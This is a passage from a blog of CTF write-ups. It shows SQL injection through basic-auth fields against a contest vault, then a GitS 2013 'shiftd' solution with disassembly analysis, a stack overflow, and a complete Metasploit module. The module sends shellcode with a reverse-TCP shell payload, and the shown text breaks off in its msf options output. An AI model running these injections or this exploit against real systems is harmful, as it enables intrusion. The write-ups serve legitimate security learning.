<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Due to recent attacks by robots we had to stop sending E-Mails. You will
</span><span class='line'>not be able to log in to the supporter page. We will take your credit
</span><span class='line'>card details anyway, thanks.</span></code></pre></td></tr></table></div></figure></p>

<p>Notice the following contents in robots.txt:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: WallE
</span><span class='line'>Disallow: /
</span><span class='line'>
</span><span class='line'># Keep em' away
</span><span class='line'>User-agent: *
</span><span class='line'>Disallow: /vault</span></code></pre></td></tr></table></div></figure></p>

<h3>SQL Injection</h3>

<p>The vault is vulnerable to SQL injection (either username or password) when providing basic auth paramters. Let&#8217;s work through the basics to determine what kind of database, names of tables, and schema for tables.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% curl -u <span class="s2">&quot;&#39; union select &#39;somestring&#39; -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>&lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello somestring&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select count(*) from sqlite_master -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>&lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello 3&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select name from sqlite_master where type = &#39;table&#39; -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello hiddensecrets&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select sql from sqlite_master where tbl_name = &#39;hiddensecrets&#39;  -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello CREATE TABLE hiddensecrets <span class="o">(</span>id INTEGER PRIMARY KEY AUTOINCREMENT, val TEXT<span class="o">)</span>&lt;/a&gt;&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>% curl -u <span class="s2">&quot;&#39; union select val from hiddensecrets -- :&quot;</span> <span class="s1">&#39;https://ctf.fluxfingers.net:1315/vault&#39;</span> | grep Hello
</span><span class='line'>    &lt;h2 <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;hello&quot;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#hello&quot;</span>&gt;Hello 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<span class="o">=</span>&lt;/a&gt;&lt;/h2&gt;
</span></code></pre></td></tr></table></div></figure>

<p>Now, simply Base64 decode the above data blob and save as a PNG. We open the fuzzy image to get the secret.</p>

<h2>Solution</h2>

<p><code>eat_all_robots</code></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/02/17/gits-2013-shiftd/">GitS 2013 - Shiftd</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-02-17T13:57:00-05:00" pubdate data-updated="true">Feb 17<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/02/17/gits-2013-shiftd/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>Points: 100</p>

<p>Find the key! (<a href="https://2013.ghostintheshellcode.com/shiftd-3a9c2a55e77d1467ee46dfb931170c737d24f310">File</a> running at shiftd.2013.ghostintheshellcode.com:5177)</p>

<h2>Analysis</h2>

<p>64-bit ELF. Note that unlike most challenges this app read from STDIN. In order to make it a networked service, we can run the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>nc -l -p 5177 -e ./shiftd
</span></code></pre></td></tr></table></div></figure></p>

<p>Closes connection after sending any data for the most part. Open up in IDA and notice the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400A42                 mov     edx, 0Ah
</span><span class='line'>.text:0000000000400A47                 mov     esi, 64
</span><span class='line'>.text:0000000000400A4C                 mov     rdi, rax
</span><span class='line'>.text:0000000000400A4F                 call    sub_4007F4
</span><span class='line'>.text:0000000000400A54                 lea     rax, <span class="o">[</span>rbp-40h<span class="o">]</span>
</span><span class='line'>.text:0000000000400A58                 lea     rsi, aNowisthewinter ; <span class="s2">&quot;NowIsTheWinterOfOurDiscountTent&quot;</span>
</span><span class='line'>.text:0000000000400A5F                 mov     rdi, rax
</span><span class='line'>.text:0000000000400A62                 call    _strcmp
</span></code></pre></td></tr></table></div></figure></p>

<p>So, need to send special passphrase of &quot;NowIsTheWinterOfOurDiscountTent&quot;.</p>

<p>Test run of the application:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc shiftd.2013.ghostintheshellcode.com 5177
</span><span class='line'>NowIsTheWinterOfOurDiscountTent
</span><span class='line'>Welcome to Shifty<span class="err">&#39;</span>s Time Formatting Service!
</span><span class='line'>What is your name?
</span><span class='line'>stacks0n
</span><span class='line'>Welcome, stacks0n
</span><span class='line'>                  @!
</span><span class='line'>Please provide a <span class="nb">time </span>format:
</span><span class='line'>%D
</span><span class='line'>Your formatted <span class="nb">time </span>is:
</span><span class='line'>02/16/13
</span><span class='line'>
</span><span class='line'>Thank you! Come again!
</span></code></pre></td></tr></table></div></figure></p>

<p>When our username is returned to us, we notice a bunch of other data being printed out as well.</p>

<p>sub_4007F4() is responsible for reading data from the socket. The prototype seems to be something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>read_from_socket<span class="o">(</span>buffer, size, delimeter<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>
where the arguments are passed in registers. The delimeter is always specified by 0x0A (newline). The method reads one byte at a time until size is met or the delimeter is reached.

Since buffers are not cleared out or null terminated, stack data is leaked when our username is printed back out to us. This is especially handy since the data contains a stack pointer which can later help us redirect execution. Note that the stack is executable, but randomized.

Unfortunately, I spent too much time focusing on the call to strftime() and its format specifiers. Although you can prepend padding (&#8216;%100D&#8217;), there is no &#8216;%n&#8217; to write the number of bytes written.

The code for reading in the format string is as follows:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>.text:0000000000400931                 mov     rax, cs:off_601068
</span><span class='line'>.text:0000000000400938                 mov     rcx, rax
</span><span class='line'>.text:000000000040093B                 and     ecx, 7FFFFFFFh
</span><span class='line'>.text:0000000000400941                 lea     rax, <span class="o">[</span>rbp+format<span class="o">]</span>
</span><span class='line'>.text:0000000000400948                 mov     edx, 0Ah
</span><span class='line'>.text:000000000040094D                 mov     rsi, rcx
</span><span class='line'>.text:0000000000400950                 mov     rdi, rax
</span><span class='line'>.text:0000000000400953                 call    read_from_socket
</span></code></pre></td></tr></table></div></figure>

<p>Note that the format string buffer is size 1024, and the call is:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>read<em>from</em>socket<span class="o">(</span>format, 0x6014b0, <span class="s1">&#39;\n&#39;</span><span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure></p>

<p>So there we have it, a stack based buffer overflow. 1064 bytes until we reach the stored return address on the stack. By leveraging the leaked stack pointer, we can redirect execution to our embedded shellcode.</p>

<p>MSF Module:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">##</span>
</span><span class='line'><span class="c1"># This file is part of the Metasploit Framework and may be subject to</span>
</span><span class='line'><span class="c1"># redistribution and commercial restrictions. Please see the Metasploit</span>
</span><span class='line'><span class="c1"># web site for more information on licensing and terms of use.</span>
</span><span class='line'><span class="c1">#   http://metasploit.com/</span>
</span><span class='line'><span class="c1">##</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>        <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>        <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>                <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;GitS 2013 Pwnable 100 - shiftd&#39;</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span><span class="p">,</span> <span class="s1">&#39;hubris&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86<em>64</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">register</em>options</span><span class="p">(</span>
</span><span class='line'>                        <span class="o">[</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;54.235.156.9&#39;</span><span class="p">),</span>
</span><span class='line'>                                <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">5177</span><span class="p">)</span>
</span><span class='line'>                        <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>                <span class="n">connect</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the secret password</span>
</span><span class='line'>                <span class="c1"># we can send extra data, not that it matters</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;NowIsTheWinterOfOurDiscountTent</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o"><em></span> <span class="mi">32</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the username</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;|</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">resp</span> <span class="o">=</span> <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># process the stack address that is leaked to us</span>
</span><span class='line'>                <span class="n">stack<em>addr</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">last</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x00\x00</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># subtract some off this stack addres to allow us more room for</span>
</span><span class='line'>                <span class="c1"># nop sled and shellcode</span>
</span><span class='line'>                <span class="n">stack</em>addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">stack<em>addr</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span> <span class="o">-</span> <span class="mh">0x100</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the format string for strftime()</span>
</span><span class='line'>                <span class="c1"># overflow alert!</span>
</span><span class='line'>                <span class="n">payload</em>size</span> <span class="o">=</span> <span class="mi">1064</span>
</span><span class='line'>                <span class="n">junk</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="mi">48</span> <span class="c1"># we don&#39;t want to trash our payload with push&#39;s</span>
</span><span class='line'>                <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">payload<em>size</span> <span class="o">-</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encoded</span><span class="o">.</span><span class="n">size</span> <span class="o">+</span> <span class="n">junk</span><span class="o">.</span><span class="n">size</span><span class="p">))</span>
</span><span class='line'>                <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="n">junk</span>
</span><span class='line'>
</span><span class='line'>                <span class="c1"># send the payload</span>
</span><span class='line'>                <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="n">stack</em>addr</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>                <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>                <span class="n">handler</span>
</span><span class='line'>                <span class="n">disconnect</span>
</span><span class='line'>        <span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf  exploit<span class="o">(</span>shiftd<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>exploit/gits/shiftd<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST  204.236.213.69   yes       The target address
</span><span class='line'>   RPORT  5177             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options <span class="o">(</span>linux/x64/shell<em>reverse</em>tcp<span class="o">)</span>:
</span><span class='line'>
